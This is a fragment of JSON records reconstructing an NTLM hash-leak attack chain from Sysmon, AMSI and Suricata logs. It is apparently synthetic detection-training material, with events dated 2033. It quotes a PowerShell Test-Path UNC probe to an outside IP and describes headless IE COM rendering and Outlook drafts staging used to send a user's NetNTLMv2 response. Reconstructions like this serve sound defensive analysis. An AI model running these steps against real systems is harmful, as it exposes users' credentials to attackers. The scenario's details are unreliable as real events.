    {"step": 2, "tactic": "HTML staged in Outlook drafts folder", "technique": "T1187", "what_happened": "At 2033-06-23 09:18:24, Sysmon EID 11 captured copy of the HTML to C:\\Users\\a.bouchard\\AppData\\Local\\Microsoft\\Outlook\\Drafts_phish_091808.html. The HTML is now in Outlook's profile folder where a future Outlook session may render it as a draft preview.", "chain_reason": "Outlook drafts folder is auto-indexed and previewed by Outlook on profile load. Staging the malicious HTML there means the next time a.bouchard opens Outlook, the draft preview triggers the UNC fetches."},
    {"step": 3, "tactic": "InternetExplorer.Application COM renders HTML, forcing UNC fetch", "technique": "T1187", "what_happened": "At 2033-06-23 09:18:32, AMSI EID 4104 captured a powershell.exe scriptblock invoking 'New-Object -ComObject InternetExplorer.Application' and Navigate to file:///<temp>/phish.html. IE's HTML rendering engine immediately attempts to fetch each UNC resource. Sysmon EID 3 captured outbound TCP from svchost.exe (LanmanWorkstation context, behalf of iexplore.exe) to 185.93.16.221:445. Rule 92300 triggered.", "chain_reason": "Using IE COM to render the HTML in headless mode is the attacker self-trigger — they don't need a victim to click. The render attempts to fetch all UNC resources, sending NetNTLM challenge-response for each."},
    {"step": 4, "tactic": "Suricata SMB NetNTLM challenge to public IP + Test-Path fallback probe", "technique": "T1187", "what_happened": "At 2033-06-23 09:18:36, Suricata flow + alert: SMB SessionSetupAndX to 185.93.16.221:445 with NetNTLMv2 challenge containing a.bouchard's NT response. UA HTTP fallback ALSO observed: AMSI captured 'Test-Path \\\\185.93.16.221\\share\\track.gif' — direct PowerShell SMB probe as fallback. Rule 31530 triggered.", "chain_reason": "Suricata SMB decoder confirms the NetNTLMv2 hash for a.bouchard was sent to the attacker IP. The Test-Path fallback is the operator's belt-and-suspenders to ensure the SMB connect fires even if IE COM fails."}
